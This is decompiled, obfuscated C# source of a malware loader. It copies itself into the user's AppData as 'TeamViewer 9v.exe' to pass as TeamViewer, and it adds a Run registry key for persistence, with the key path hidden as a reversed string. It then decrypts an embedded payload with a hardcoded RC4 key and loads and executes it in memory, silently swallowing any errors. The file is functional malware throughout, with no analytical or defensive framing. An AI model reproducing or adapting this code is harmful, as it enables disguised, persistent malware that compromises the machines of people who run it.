using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

internal sealed class Class0
{
	internal sealed class Class1
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 62263)]
		private struct Struct0
		{
		}

		internal sealed class Class2
		{
			[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 344)]
			private struct Struct1
			{
			}

			private static readonly char[] char_0;

			private static readonly char[] char_1;

			private static readonly string[] string_0;

			internal static byte byte_0/* Not supported: data(00) */;

			static Class2()
			{
				char_1 = new char[172];
				char[] array = new char[8];
				array[2] = '⠼';
				array[6] = '≚';
				array[5] = '㔚';
				array[1] = 'ὓ';
				array[7] = '\u0c64';
				array[4] = '㓅';
				array[0] = 'ῦ';
				array[3] = '㱥';
				string_0 = new string[6];
				char_0 = array;
			}
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		private struct Struct2
		{
		}

		internal static byte byte_0/* Not supported: data(00) */;

		private static bool bool_0;

		private static readonly char[] char_0;

		private static readonly char[] char_1;

		private static readonly string[] string_0;

		internal static byte byte_1/* Not supported: data(00) */;

		static Class1()
		{
			char_1 = new char[8];
			char[] array = new char[8];
			array[2] = '\u0efa';
			array[1] = '㬎';
			array[7] = '㙮';
			array[0] = '\u0fa3';
			array[5] = '⦗';
			array[6] = 'ᇙ';
			array[3] = '௯';
			array[4] = '㧛';
			string_0 = new string[1];
			char_0 = array;
		}
	}

	internal sealed class Class3
	{
	}

	private static void Main(string[] args)
	{
		object[] parameters = new object[0];
		new Random().Next(300, 750);
		long num = Environment.TickCount;
		_ = Environment.TickCount - num;
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\TeamViewer 9v.exe"))
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\TeamViewer 9v.exe");
		}
		string name = smethod_0("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS");
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		registryKey.SetValue("TeamViewer 9", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\TeamViewer 9v.exe");
		registryKey.Close();
		try
		{
			ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
			byte[] rawAssembly = smethod_1((byte[])resourceManager.GetObject("YaH350vUrAB7wco59"), "3e6rFgvJaGR2vJo3nrKvCAoFnlFQGYU5z06qNa6iZER26AQnOmtnIaVD0Ad");
			resourceManager.ReleaseAllResources();
			Assembly assembly = Assembly.Load(rawAssembly);
			if (assembly.EntryPoint!.GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	private static string smethod_0(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0)
	{
		byte[] bytes = Encoding.Default.GetBytes(string_0);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes[i % bytes.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < byte_0.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			byte_0[j] ^= array[num2];
		}
		return byte_0;
	}
}
